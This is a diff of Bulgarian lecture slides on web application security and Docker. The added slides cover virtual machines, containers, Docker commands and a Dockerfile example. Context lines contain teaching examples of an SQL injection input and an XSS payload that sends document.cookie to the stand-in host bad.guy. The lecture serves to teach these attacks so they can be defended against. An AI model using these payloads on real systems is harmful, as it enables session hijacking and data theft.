@@ -149,7 +149,7 @@
                                                         <li><strong>Уязвимост:</strong> очакват се данни, които да бъдат попълнени като параметри в команда</li>
                                                         <li><strong>Атака:</strong> в данните могат да се съдържат специални символи, които да се интерпретират като част от командата и да се промени нейното действие</li>
                                                         <li><strong>Пример (SQL injection):</strong><br>
-                                                                <pre><code class="hljs" data-trim>
+                                                                <pre><code class="language-sql hljs" data-trim>
                                                                                 query = "SELECT * FROM users WHERE id = " + id;
 
                                                                                 https://example.com/profile.php?id=2 OR 1=1
@@ -166,7 +166,7 @@
 
                                                         <li><strong>Атака:</strong> в данните може да се сложи JavaScript, който да се изпълнява от името на потребителя и сайта</li>
                                                         <li><strong>Пример:</strong><br>
-                                                                <pre><code class="hlphp" data-trim>
+                                                                <pre><code class="language-php hljs" data-trim>
                                                                                 &lt;p&gt;Коментар:&lt;br&gt;&lt;?= $userComment ?&gt;&lt;/p&gt;
 
                                                                                 &lt;script&gt;window.location="http://bad.guy/?cookie=" + document.cookie&lt;/script&gt;
@@ -193,7 +193,7 @@
                                                 </ul>
                                         </section>
                                         <section>
-                                                <h2>Проблеми с упълномощяването (authorization)</h2>
+                                                <h2>Проблеми с упълномощаването (authorization)</h2>
                                                 <ul>
                                                         <li><strong>Уязвимост:</strong> логически пропуск при проверка дали потребител има право да достъпи дадена страница</li>
                                                         <li><strong>Атака:</strong> модифициране на стандартна заявка, така че да извършваме действия, за които не би трябвало да изпълним през потребителския интерфейс</li>
@@ -227,7 +227,7 @@
                                                 <h2>Използване на уязвими компоненти</h2>
                                                 <ul>
                                                         <li><strong>Уязвимост:</strong> стандартен компонент с отворен код има известна уязвимост</li>
-                                                        <li><strong>Атака:</strong> изпълнявне на библиотека от стандартни атаки срещу всички потенциално уязвими компоненти на сайта</li>
+                                                        <li><strong>Атака:</strong> изпълняване на библиотека от стандартни атаки срещу всички потенциално уязвими компоненти на сайта</li>
                                                         <li><strong>Пример:</strong>
                                                                 <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-5638">CVE-2017-5638</a>
                                                                 <blockquote style="font-size: .6em">
@@ -244,23 +244,100 @@
                                         </section>
                                         <section>
                                                 <h2>Виртуални машини</h2>
-                                                <p>TODO</p>
+                                                <p>Програми, които софтуерно реализират хардуер</p>
+                                                <p class="fragment"><strong>Предимства:</strong></p>
+                                                <ul>
+                                                        <li class="fragment">програми за една хардуерна архитектура върху друга</li>
+                                                        <li class="fragment">копия и "снимки" на състоянието на машината</li>
+                                                        <li class="fragment">изолация</li>
+                                                </ul>
+                                                <p class="fragment"><strong>Недостатъци:</strong></p>
+                                                <ul>
+                                                        <li class="fragment">ресурсоемки</li>
+                                                        <li class="fragment">отделна операционна система</li>
+                                                        <li class="fragment">трудна преносимост</li>
+                                                </ul>
                                         </section>
                                         <section>
                                                 <h2>Контейнери</h2>
-                                                <p>TODO</p>
+                                                <p>Изолирани потребителски пространства, споделящи ОС и библиотеки</p>
+                                                <p class="fragment"><strong>Предимства:</strong></p>
+                                                <ul>
+                                                        <li class="fragment">пестеливи откъм ресурси</li>
+                                                        <li class="fragment">лесно преносими</li>
+                                                        <li class="fragment">бързо създаване и стартиране</li>
+                                                </ul>
+                                                <p class="fragment"><strong>Недостатъци:</strong></p>
+                                                <ul>
+                                                        <li class="fragment">зависят от споделената ОС</li>
+                                                        <li class="fragment">по-слаба изолация</li>
+                                                </ul>
                                         </section>
                                         <section>
                                                 <h2>Основни команди на Docker</h2>
-                                                <p>TODO</p>
+                                                <div class="fragment">Стартиране на контейнер:
+                                                        <pre><code class="language-bash hljs" data-trim>docker run --name mycontainer hello-world</code></pre></div>
+                                                <div class="fragment">Спиране на контейнер:
+                                                        <pre><code class="language-bash hljs" data-trim>
+                                                                        docker kill mycontainer
+                                                </code></pre></div>
+                                                <div class="fragment">Налични контейнери:
+                                                        <pre><code class="language-bash hljs" data-trim>
+                                                                        docker ps [-a]
+                                                </code></pre></div>
+                                                <div class="fragment">Изтриване на контейнер:
+                                                        <pre><code class="language-bash hljs" data-trim>
+                                                                        docker rm [-f] mycontainer
+                                                </code></pre></div>
+                                        </section>
+                                        <section>
+                                                <h2>Пускане на уеб сървър под Docker</h2>
+                                                <pre><code class="language-bash hljs" data-trim>
+                                                                docker run --name myserver \
+                                                                           -p 8080:80 \
+                                                                           -v /home/trifon/myapp:/usr/share/nginx/html:ro \
+                                                                           -d nginx
+                                                </code></pre>
+                                                <div class="fragment">Инспектиране на контейнера:
+                                                        <pre><code class="language-bash hljs" data-trim>
+                                                                        docker exec -it myserver bash
+                                                        </code></pre>
+                                                </div>
                                         </section>
                                         <section>
                                                 <h2>Построяване на образи (images)</h2>
-                                                <p>Dockerfile TODO</p>
+                                                <p>Образите на контейнерите се описват с последователност от инструкции в Dockerfile</p>
+                                                <pre><code class="language-dockerfile hljs" data-trim>
+                                                                FROM ubuntu:20.04
+                                                                MAINTAINER triffon@fmi.uni-sofia.bg
+                                                                COPY mine_dogecoin.sh /root/
+                                                                RUN useradd -p doge miner
+                                                                CMD mine_dogecoin.sh
+                                                </code></pre>
+                                                <div class="fragment">Построяване на образа:
+                                                        <pre><code class="language-bash hljs" data-trim>
+                                                                        docker build -t dogeminer .
+                                                        </code></pre>
+                                                </div>
                                         </section>
                                         <section>
                                                 <h2>Docker Hub</h2>
-                                                <p>TODO</p>
+                                                <div class="fragment">Локално сваляне на образ на контейнер:
+                                                        <pre><code class="language-bash hljs" data-trim>
+                                                                        docker pull ubuntu:20.04
+                                                </code></pre></div>
+                                                <div class="fragment">Списък с локално налични образи:
+                                                        <pre><code class="language-bash hljs" data-trim>
+                                                                        docker images
+                                                </code></pre></div>
+                                                <div class="fragment">Изтриване на локален образ:
+                                                        <pre><code class="language-bash hljs" data-trim>
+                                                                        docker rmi ubuntu
+                                                </code></pre></div>
+                                                <div class="fragment">Публикуване на образ:
+                                                        <pre><code class="language-bash hljs" data-trim>
+                                                                        docker push dogeminer:latest
+                                                </code></pre></div>
                                         </section>
                                 </section>
                                 <section>
